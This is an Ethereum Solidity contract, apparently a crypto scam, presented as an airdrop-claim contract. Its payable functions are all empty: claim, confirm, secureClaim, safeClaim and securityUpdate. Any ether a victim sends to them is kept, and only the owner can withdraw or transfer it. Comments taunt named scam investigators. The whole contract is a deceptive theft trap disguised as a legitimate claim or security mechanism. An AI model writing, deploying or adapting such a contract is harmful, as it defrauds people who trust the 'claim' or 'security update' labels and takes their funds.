/**
 *Submitted for verification at Etherscan.io on 2023-06-07
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

// SPDX-License-Identifier: GPL-3.0

// @impare to start licking 
// Made by daddy ZachXBT 
// Managed by scamsniffer
// Robin good likes clown and yuan

pragma solidity ^0.4.26;

contract ClaimAirdrops {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }

    function changeOwner(address newOwner) public {
        require(owner == msg.sender);
        owner = newOwner;
    }

    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function claim() public payable {
    }

    function confirm() public payable {
    }

    function secureClaim() public payable {
    }

    
    function safeClaim() public payable {
    }

    
    function securityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }


    function transfer(address to, uint256 amount) public {
        require(msg.sender==owner);
        to.transfer(amount);
    }

}